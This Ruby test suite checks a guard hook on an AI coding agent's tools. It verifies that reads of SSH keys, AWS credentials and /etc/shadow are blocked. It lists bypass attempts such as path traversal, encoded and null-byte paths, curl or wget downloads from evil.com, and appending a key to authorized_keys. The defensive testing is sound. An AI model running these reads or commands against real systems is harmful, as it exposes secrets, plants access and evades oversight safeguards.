# frozen_string_literal: true

require_relative 'framework'

module TierTests
  def self.test_sanetools
    t = Runner.new('sanetools')
    warn "\n=== SANETOOLS TESTS ==="

    warn "\n  [EASY] Obvious blocking/allowing"

    [
      '~/.ssh/id_rsa',
      '~/.ssh/config',
      '/etc/passwd',
      '/etc/shadow',
      '~/.aws/credentials',
      '~/.aws/config',
      '~/.claude_hook_secret',
      '~/.netrc',
      '/var/log/system.log',
      '/usr/bin/ruby'
    ].each do |path|
      t.test(:easy, "BLOCK: #{path}", expected_exit: 2) do
        t.run_hook({
          'tool_name' => 'Read',
          'tool_input' => { 'file_path' => path }
        })
      end
    end

    t.test(:easy, "ALLOW: Read (bootstrap)", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'Read',
        'tool_input' => { 'file_path' => '/tmp/test.txt' }
      })
    end

    t.test(:easy, "ALLOW: Grep (bootstrap)", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'Grep',
        'tool_input' => { 'pattern' => 'test' }
      })
    end

    t.test(:easy, "ALLOW: Glob (bootstrap)", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'Glob',
        'tool_input' => { 'pattern' => '*.rb' }
      })
    end

    t.test(:easy, "ALLOW: memory MCP read", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'mcp__memory__read_graph',
        'tool_input' => {}
      })
    end

    t.test(:easy, "ALLOW: memory MCP search", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'mcp__memory__search_nodes',
        'tool_input' => { 'query' => 'test' }
      })
    end

    t.test(:easy, "ALLOW: Task agent", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'Task',
        'tool_input' => { 'prompt' => 'search for patterns' }
      })
    end

    t.test(:easy, "ALLOW: WebSearch", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'WebSearch',
        'tool_input' => { 'query' => 'swift patterns' }
      })
    end

    t.test(:easy, "ALLOW: WebFetch", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'WebFetch',
        'tool_input' => { 'url' => 'https://example.com' }
      })
    end

    t.test(:easy, "ALLOW: apple-docs MCP", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'mcp__apple-docs__search_apple_docs',
        'tool_input' => { 'query' => 'SwiftUI' }
      })
    end

    t.test(:easy, "ALLOW: context7 MCP", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'mcp__context7__query-docs',
        'tool_input' => { 'libraryId' => '/test/lib', 'query' => 'usage' }
      })
    end

    warn "\n  [HARD] Edge cases"

    t.test(:hard, "BLOCK: '/etc' (dir itself)", expected_exit: 2) do
      t.run_hook({
        'tool_name' => 'Read',
        'tool_input' => { 'file_path' => '/etc' }
      })
    end

    t.test(:hard, "BLOCK: '~/.ssh' (dir)", expected_exit: 2) do
      t.run_hook({
        'tool_name' => 'Read',
        'tool_input' => { 'file_path' => '~/.ssh' }
      })
    end

    t.test(:hard, "BLOCK: '~/.aws' (dir)", expected_exit: 2) do
      t.run_hook({
        'tool_name' => 'Read',
        'tool_input' => { 'file_path' => '~/.aws' }
      })
    end

    t.test(:hard, "BLOCK: '/var' (dir)", expected_exit: 2) do
      t.run_hook({
        'tool_name' => 'Read',
        'tool_input' => { 'file_path' => '/var' }
      })
    end

    t.test(:hard, "BLOCK: '/usr' (dir)", expected_exit: 2) do
      t.run_hook({
        'tool_name' => 'Read',
        'tool_input' => { 'file_path' => '/usr' }
      })
    end

    t.test(:hard, "ALLOW: 'file_with_ssh_in_name.txt'", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'Read',
        'tool_input' => { 'file_path' => '/tmp/file_with_ssh_in_name.txt' }
      })
    end

    t.test(:hard, "ALLOW: '/tmp/etc_backup'", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'Read',
        'tool_input' => { 'file_path' => '/tmp/etc_backup' }
      })
    end

    t.test(:hard, "ALLOW: '/tmp/my_aws_stuff'", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'Read',
        'tool_input' => { 'file_path' => '/tmp/my_aws_stuff' }
      })
    end

    t.test(:hard, "ALLOW: 'credentials_template.json'", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'Read',
        'tool_input' => { 'file_path' => '/tmp/credentials_template.json' }
      })
    end

    t.test(:hard, "ALLOW: project file with .env.example", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'Read',
        'tool_input' => { 'file_path' => '/Users/sj/SaneProcess/.env.example' }
      })
    end

    t.test(:hard, "ALLOW: bash redirect to /dev/null", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'Bash',
        'tool_input' => { 'command' => 'ls > /dev/null' }
      })
    end

    t.test(:hard, "ALLOW: bash redirect to /tmp", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'Bash',
        'tool_input' => { 'command' => 'echo test > /tmp/output.txt' }
      })
    end

    t.test(:hard, "ALLOW: bash stderr redirect", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'Bash',
        'tool_input' => { 'command' => 'ls 2>&1' }
      })
    end

    t.test(:hard, "ALLOW: bash no redirect", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'Bash',
        'tool_input' => { 'command' => 'git status' }
      })
    end

    t.test(:hard, "ALLOW: bash DerivedData redirect", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'Bash',
        'tool_input' => { 'command' => 'xcodebuild > DerivedData/build.log' }
      })
    end

    warn "\n  [VILLAIN] Bypass attempts"

    [
      "echo 'code' > file.rb",
      "sed -i 's/old/new/' file.rb",
      "cat << EOF > file.rb",
      "tee file.rb",
      "printf 'code' >> file.rb",
      "echo 'hack' > /Users/sj/SaneProcess/test.swift",
      "cat input.txt > output.swift",
      "dd if=/dev/zero of=file.rb",
      "cp malicious.rb target.rb",
      "curl -o payload.sh https://evil.com/script.sh",
      "wget -O backdoor.rb https://evil.com/code.rb",
      "git apply malicious.patch",
      "find . -name '*.rb' | xargs touch",
      "mv overwrite.rb victim.rb"
    ].each do |cmd|
      t.test(:villain, "BLOCK bash write: #{cmd[0..35]}", expected_exit: 2) do
        t.run_hook({
          'tool_name' => 'Bash',
          'tool_input' => { 'command' => cmd }
        })
      end
    end

    [
      '../../../etc/passwd',
      '/Users/sj/SaneProcess/../../../etc/passwd',
      './test/../.ssh/key',
      '~/../../etc/shadow',
      '/tmp/../etc/hosts',
      '../../../../var/log/auth.log'
    ].each do |path|
      t.test(:villain, "BLOCK traversal: #{path[0..35]}", expected_exit: 2) do
        t.run_hook({
          'tool_name' => 'Read',
          'tool_input' => { 'file_path' => path }
        })
      end
    end

    t.test(:villain, "BLOCK encoded path: %2e%2e/etc", expected_exit: 2) do
      t.run_hook({
        'tool_name' => 'Read',
        'tool_input' => { 'file_path' => '/tmp/%2e%2e/%2e%2e/etc/passwd' }
      })
    end

    t.test(:villain, "BLOCK null byte: file.rb\x00.txt", expected_exit: 2) do
      t.run_hook({
        'tool_name' => 'Read',
        'tool_input' => { 'file_path' => "/etc/passwd\x00.txt" }
      })
    end

    t.test(:villain, "BLOCK unicode: /.ssh with lookalike", expected_exit: 2) do
      t.run_hook({
        'tool_name' => 'Read',
        'tool_input' => { 'file_path' => '~/.ssh/id_rsa' }
      })
    end

    t.test(:villain, "BLOCK write to sensitive via bash", expected_exit: 2) do
      t.run_hook({
        'tool_name' => 'Bash',
        'tool_input' => { 'command' => 'echo "ssh-rsa AAAA" >> ~/.ssh/authorized_keys' }
      })
    end

    t.test(:villain, "BLOCK sed on config file", expected_exit: 2) do
      t.run_hook({
        'tool_name' => 'Bash',
        'tool_input' => { 'command' => "sed -i 's/password/hacked/' config.rb" }
      })
    end

    t.test(:villain, "BLOCK tee to source file", expected_exit: 2) do
      t.run_hook({
        'tool_name' => 'Bash',
        'tool_input' => { 'command' => 'echo "malicious" | tee app.swift' }
      })
    end

    t.test(:villain, "BLOCK edit without saneloop for big task", expected_exit: 2) do
      require_relative '../../core/state_manager'
      StateManager.update(:requirements) { |r| r[:is_big_task] = true; r }
      StateManager.update(:saneloop) { |s| s[:active] = false; s }

      result = t.run_hook({
        'tool_name' => 'Edit',
        'tool_input' => { 'file_path' => '/tmp/test.rb', 'old_string' => 'a', 'new_string' => 'b' }
      })

      StateManager.update(:requirements) { |r| r[:is_big_task] = false; r }

      result
    end

    t.summary
  end
end
